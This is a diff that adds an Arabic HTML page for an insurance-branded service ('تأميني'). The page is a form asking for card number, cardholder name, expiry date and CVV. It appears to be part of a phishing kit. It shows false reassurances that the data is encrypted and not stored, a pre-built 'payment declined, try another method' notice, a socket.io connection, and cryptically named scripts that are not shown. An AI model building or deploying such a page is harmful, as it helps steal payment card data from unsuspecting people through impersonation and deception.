@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+
+<html dir="rtl" lang="ar">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>تأميني - بيانات البطاقة البنكية</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="css/styleg.css">
+
+</head>
+<body>
+<div class="app">
+<header>
+<div class="logo">
+<div class="logo-icon" style="display:flex;align-items:center;justify-content:center;padding:0;overflow:hidden;"><img alt="تأميني" src="images/logo.png" style="width:100%;height:100%;object-fit:cover;display:block;"/></div>
+<span>تأميني</span>
+</div>
+<a class="login-link" href="index.html#">تسجيل الدخول</a>
+</header>
+
+<main>
+
+<form id="formStep6" novalidate="" autocomplete="off">
+
+
+
+<div class="decline-box" id="declineBox">
+  <div class="decline-icon">
+    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+      <circle cx="12" cy="12" r="10"></circle>
+      <line x1="12" y1="8" x2="12" y2="12"></line>
+      <line x1="12" y1="16" x2="12.01" y2="16"></line>
+    </svg>
+  </div>
+  <div class="decline-text">
+    <div class="decline-title">تم رفض طريقة الدفع</div>
+    <div class="decline-sub">يرجى تجربة طريقة دفع أخرى أو التواصل مع البنك</div>
+  </div>
+</div>
+
+<div class="field">
+<label class="label" for="cardNumber">رقم البطاقة</label>
+<div class="card-field-wrapper">
+  <input id="cardNumber" class="card-input" name="cardNumber" placeholder="" type="tel" maxlength="19" autocomplete="off"/>
+  <div class="card-logos">
+    <img id="s6NetworkLogo" src="" alt="">
+  </div>
+</div>
+<div class="error" id="cardNumberError"></div>
+</div>
+
+
+<div class="field">
+<label class="label" for="cardHolderName">اسم حامل البطاقة</label>
+<input id="cardHolderName" name="cardHolderName" placeholder="الاسم كما هو مكتوب على البطاقة" type="text" autocomplete="off"/>
+<div class="error" id="cardHolderNameError"></div>
+</div>
+
+
+<div class="expiry-cvv-row">
+<div class="field">
+<label class="label" for="expiryDate">تاريخ الانتهاء</label>
+<input id="expiryDate" class="card-input" name="expiryDate" placeholder="MM/YY" type="tel" maxlength="5" autocomplete="off"/>
+<div class="error" id="expiryDateError"></div>
+</div>
+<div class="field">
+<label class="label" for="cvv">رمز الأمان (CVV)</label>
+<input id="cvv" class="card-input" name="cvv" placeholder="" type="tel" maxlength="3" autocomplete="off"/>
+<div class="error" id="cvvError"></div>
+</div>
+</div>
+
+<div class="secure-notice">
+<span class="secure-icon">🔒</span>
+بياناتك محمية بأعلى معايير الأمان والتشفير
+</div>
+
+<p class="info-text">
+جميع المعلومات المالية محمية ومشفرة. لن يتم حفظ بيانات البطاقة على خوادمنا.
+</p>
+
+<div class="buttons-row">
+<a class='btn btn-secondary' href='summary.html'>السابق</a>
+<button class="btn btn-primary" type="submit">التالي</button>
+</div>
+
+</form>
+</main>
+</div>
+
+
+<div class="loading-screen" id="loadingScreen">
+<div class="loading-content">
+<div class="loading-dots">
+<div></div>
+<div></div>
+<div></div>
+<div></div>
+</div>
+<div class="loading-text" id="loadingText">جاري التحميل...</div>
+<div class="loading-subtext" id="loadingSubtext">يرجى الانتظار</div>
+</div>
+</div>
+<script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
+<script src="js/paym.js"></script>
+<script src="js/f6p9.js"></script>
+<script src="js/kn5k.js"></script>
+</body>
+</html>
